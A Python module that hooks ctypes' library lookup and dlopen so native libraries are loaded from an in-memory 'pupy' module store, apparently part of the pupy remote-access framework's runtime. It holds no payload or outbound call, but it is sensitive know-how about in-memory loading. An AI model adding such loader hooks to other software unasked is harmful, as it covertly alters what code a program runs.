# -*- coding: utf-8 -*-

__all__ = ('apply_dl_hacks',)

import os
import sys
import ctypes
import pupy

try:
    import ctypes.util
    have_ctypes_util = True
except ImportError:
    have_ctypes_util = False

have_ctypes_dlopen = hasattr(ctypes, '_dlopen')

NATIVE_LIB_PATTERNS = [
    'lib{}.so', '{}.so',
    'lib{}.pyd', '{}.pyd',
    'lib{}.dll', '{}.dll',
    'lib{}27.dll'
]


def _find_library(name):
    for pattern in NATIVE_LIB_PATTERNS:
        libname = pattern.format(name)
        try:
            return ctypes.CDLL(libname)
        except:
            pass


def _pupy_make_library_path(name):
    if not name:
        return

    if 'pupy:' in name:
        name = name[name.find('pupy:')+5:]
        name = os.path.relpath(name)
        name = '/'.join([
            x for x in name.split(os.path.sep) if x and x not in ('.', '..')
        ])

    return name


def _pupy_find_library(name):
    pupyized = _pupy_make_library_path(name)
    if pupyized in pupy.modules:
        pupy.dprint('FIND LIBRARY: {} => {}', name, pupyized)
        return pupyized
    else:
        return ctypes.util._system_find_library(name)


def _pupy_dlopen(name, *args, **kwargs):
    pupy.dprint('ctypes dlopen: {}', name)
    name = _pupy_make_library_path(name)
    pupy.dprint(
        'ctypes dlopen / pupyized: {} (system {})',
        name, ctypes._system_dlopen)

    handle = pupy.load_dll(name)
    if handle:
        return handle
    else:
        pupy.dprint('load_dll by name ({}) failed', name)

    return ctypes._system_dlopen(name, *args, **kwargs)


def apply_dl_hacks():
    if have_ctypes_dlopen:
        setattr(ctypes, '_system_dlopen', ctypes._dlopen)

    if have_ctypes_util:
        ctypes.util._system_find_library = ctypes.util.find_library

        if hasattr(ctypes.util, '_findLib_gcc'):
            ctypes.util._findLib_gcc = lambda name: None
    else:
        ctypes_util = pupy.make_module('ctypes.util')

        setattr(ctypes_util, '_system_find_library', _find_library)

    ctypes._dlopen = _pupy_dlopen
    ctypes.util.find_library = _pupy_find_library

    libpython = None

    if sys.platform == 'win32':
        try:
            libpython = ctypes.PyDLL('python27.dll')
        except WindowsError:
            pupy.dprint('python27.dll not found')
    else:
        for libname in (None, 'libpython2.7.so.1.0', 'libpython2.7.so'):
            try:
                candidate = ctypes.PyDLL(libname)
            except OSError:
                continue

            if hasattr(candidate, '_Py_PackageContext'):
                libpython = candidate
                break

    if libpython is not None:
        pupy.dprint('Set ctypes.pythonapi to {}', libpython)
        ctypes.pythonapi = libpython
